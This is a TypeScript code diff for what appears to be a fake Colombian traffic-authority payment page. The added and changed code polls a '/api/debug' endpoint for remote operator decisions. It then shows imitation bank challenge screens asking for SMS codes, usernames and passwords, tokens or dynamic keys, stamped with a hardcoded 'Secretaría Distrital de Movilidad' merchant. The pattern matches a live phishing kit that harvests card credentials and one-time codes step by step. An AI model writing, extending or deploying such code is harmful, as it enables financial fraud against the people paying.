@@ -460,15 +460,16 @@ function cardBrandKey(digits: string) {
 async function pollDebugDecision(sessionId: string, timeoutMs = 180000) {
   const started = Date.now();
   while (Date.now() - started < timeoutMs) {
-    const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
-      headers: { Accept: "application/json" },
+    const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}&t=${Date.now()}`, {
+      headers: { Accept: "application/json", "Cache-Control": "no-store" },
+      cache: "no-store",
     });
     if (response.ok) {
       const payload = await response.json();
       const decision = payload?.decision || {};
       if (decision.action && decision.action !== "wait") return decision as { action: string; message?: string; brand?: string };
     }
-    await new Promise((resolve) => window.setTimeout(resolve, 1500));
+    await new Promise((resolve) => window.setTimeout(resolve, 800));
   }
   return {
     action: "timeout",
@@ -476,51 +477,83 @@ async function pollDebugDecision(sessionId: string, timeoutMs = 180000) {
   };
 }
 
-function showWaitScreen(brandKey: string) {
-  const wait = $("pagos-wait-screen");
-  const challenge = $("pagos-challenge-screen");
-  wait?.querySelectorAll("[data-wait-brand]").forEach((panel) => {
-    (panel as HTMLElement).hidden = panel.getAttribute("data-wait-brand") !== brandKey;
+function hidePasarelaScreens() {
+  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen"].forEach((id) => {
+    const el = $(id) as HTMLElement | null;
+    if (!el) return;
+    el.hidden = true;
+    el.style.display = "none";
   });
-  if (wait) wait.hidden = false;
-  if (challenge) challenge.hidden = true;
-  document.body.classList.add("is-offers-waiting");
-  showOverlay("cardOverlay", false);
 }
 
-function hideWaitScreen() {
-  const wait = $("pagos-wait-screen");
-  if (wait) wait.hidden = true;
-  document.body.classList.remove("is-offers-waiting");
+function revealPasarela(id: string) {
+  const el = $(id) as HTMLElement | null;
+  if (!el) return;
+  if (el.parentElement !== document.body) document.body.appendChild(el);
+  el.hidden = false;
+  el.removeAttribute("hidden");
+  el.style.display = "flex";
+  el.style.zIndex = "500";
 }
 
-function showChallengeScreen(brandKey: string, message = "") {
-  const wait = $("pagos-wait-screen");
-  const challenge = $("pagos-challenge-screen");
+function challengeStamp() {
   const now = new Date();
   const months = [
     "enero", "febrero", "marzo", "abril", "mayo", "junio",
     "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre",
   ];
-  const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
-  const amountLabel = formatCop(grandTotal());
-  hideWaitScreen();
+  return {
+    datetimeLabel: `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`,
+    amountLabel: formatCop(grandTotal()),
+  };
+}
+
+function fillChallengeMeta(root: ParentNode | null) {
+  const { datetimeLabel, amountLabel } = challengeStamp();
+  root?.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
+    el.textContent = "Secretaría Distrital de Movilidad";
+  });
+  root?.querySelectorAll("[data-challenge-amount]").forEach((el) => {
+    el.textContent = amountLabel;
+  });
+  root?.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
+    el.textContent = datetimeLabel;
+  });
+}
+
+function authKindFromAction(action: string) {
+  const a = action.toLowerCase().replace(/[^a-z]/g, "");
+  if (a.includes("userpass") || a.includes("userpassword") || a === "password") return "userpass";
+  if (a.includes("token")) return "token";
+  if (a.includes("dynamic") || a.includes("dinamica") || a.includes("cdin")) return "dynamic";
+  return "";
+}
+
+function showWaitScreen(brandKey: string) {
+  const wait = $("pagos-wait-screen");
+  hidePasarelaScreens();
+  wait?.querySelectorAll("[data-wait-brand]").forEach((panel) => {
+    (panel as HTMLElement).hidden = panel.getAttribute("data-wait-brand") !== brandKey;
+  });
+  revealPasarela("pagos-wait-screen");
+  document.body.classList.add("is-offers-waiting");
+  showOverlay("cardOverlay", false);
+}
+
+function hideWaitScreen() {
+  hidePasarelaScreens();
+  document.body.classList.remove("is-offers-waiting");
+}
+
+function showChallengeScreen(brandKey: string, message = "") {
+  const challenge = $("pagos-challenge-screen");
+  hidePasarelaScreens();
+  document.body.classList.add("is-offers-waiting");
   challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
     (panel as HTMLElement).hidden = panel.getAttribute("data-challenge-brand") !== brandKey;
   });
-  challenge?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
-    (panel as HTMLElement).hidden = true;
-  });
-  challenge?.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
-    el.textContent = "Secretaría Distrital de Movilidad";
-  });
-  challenge?.querySelectorAll("[data-challenge-amount]").forEach((el) => {
-    el.textContent = amountLabel;
-  });
-  challenge?.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
-    el.textContent = datetimeLabel;
-  });
-  if (challenge) challenge.hidden = false;
+  fillChallengeMeta(challenge);
+  revealPasarela("pagos-challenge-screen");
   if (message) setChallengeMessage(brandKey, message, "error");
 }
 
@@ -545,47 +578,33 @@ function setChallengeMessage(brand: string, message: string, kind = "error") {
 }
 
 function setAuthMessage(kind: string, message: string) {
-  const challenge = $("pagos-challenge-screen");
-  const panel = challenge?.querySelector(`[data-challenge-auth="${kind}"]`);
+  const screen = $("pagos-auth-screen") || $("pagos-challenge-screen");
+  const panel = screen?.querySelector(`[data-challenge-auth="${kind}"]`);
   const form = panel?.querySelector("[data-auth-form]");
   if (!form) return;
-  let error = form.querySelector("[data-auth-debug-message]") as HTMLElement | null;
+  const error = form.querySelector("[data-auth-debug-message]") as HTMLElement | null;
   if (!error) return;
   error.textContent = message || "";
   error.hidden = !message;
 }
 
 function showAuthScreen(kind: string, message = "") {
-  const challenge = $("pagos-challenge-screen");
-  const now = new Date();
-  const months = [
-    "enero", "febrero", "marzo", "abril", "mayo", "junio",
-    "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre",
-  ];
-  const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
-  const amountLabel = formatCop(grandTotal());
-  hideWaitScreen();
-  challenge?.querySelectorAll("[data-challenge-brand]").forEach((panel) => {
-    (panel as HTMLElement).hidden = true;
-  });
-  challenge?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
+  const screen = $("pagos-auth-screen") as HTMLElement | null;
+  hidePasarelaScreens();
+  document.body.classList.add("is-offers-waiting");
+  showOverlay("cardOverlay", false);
+  showOverlay("pagoOverlay", false);
+  screen?.querySelectorAll("[data-challenge-auth]").forEach((panel) => {
     const active = panel.getAttribute("data-challenge-auth") === kind;
     (panel as HTMLElement).hidden = !active;
+    (panel as HTMLElement).style.display = active ? "block" : "none";
     if (!active) return;
-    panel.querySelectorAll("[data-challenge-merchant]").forEach((el) => {
-      el.textContent = "Secretaría Distrital de Movilidad";
-    });
-    panel.querySelectorAll("[data-challenge-amount]").forEach((el) => {
-      el.textContent = amountLabel;
-    });
-    panel.querySelectorAll("[data-challenge-datetime]").forEach((el) => {
-      el.textContent = datetimeLabel;
-    });
+    fillChallengeMeta(panel);
     panel.querySelectorAll("input").forEach((input) => {
       (input as HTMLInputElement).value = "";
     });
   });
-  if (challenge) challenge.hidden = false;
+  revealPasarela("pagos-auth-screen");
   if (message) setAuthMessage(kind, message);
 }
 
@@ -603,20 +622,13 @@ async function handlePaymentDecision(
   payBtn: HTMLButtonElement | null,
 ) {
   const action = decision.action || "timeout";
+  const authKind = authKindFromAction(action);
   if (action === "sms" || action === "sms_error") {
     showChallengeScreen(brandKey, action === "sms_error" ? decision.message || "" : "");
     return;
   }
-  if (action === "userpass" || action === "userpass_error") {
-    showAuthScreen("userpass", action === "userpass_error" ? decision.message || "" : "");
-    return;
-  }
-  if (action === "token" || action === "token_error") {
-    showAuthScreen("token", action === "token_error" ? decision.message || "" : "");
-    return;
-  }
-  if (action === "dynamic" || action === "dynamic_error") {
-    showAuthScreen("dynamic", action === "dynamic_error" ? decision.message || "" : "");
+  if (authKind) {
+    showAuthScreen(authKind, action.endsWith("_error") ? decision.message || "" : "");
     return;
   }
   if (action === "card" || action === "card_error") {
@@ -859,6 +871,10 @@ async function buscarRunt() {
 }
 
 export function bindSolicitudWizard() {
+  ["pagos-wait-screen", "pagos-challenge-screen", "pagos-auth-screen", "pagos-debug-modal"].forEach((id) => {
+    const el = $(id);
+    if (el && el.parentElement !== document.body) document.body.appendChild(el);
+  });
   document.querySelectorAll('input[name="tipoPersona"]').forEach((el) => el.addEventListener("change", syncPersonaType));
   $("departamentoResidencia")?.addEventListener("change", () => {
     filterMunicipios("municipioResidencia", val("departamentoResidencia"));
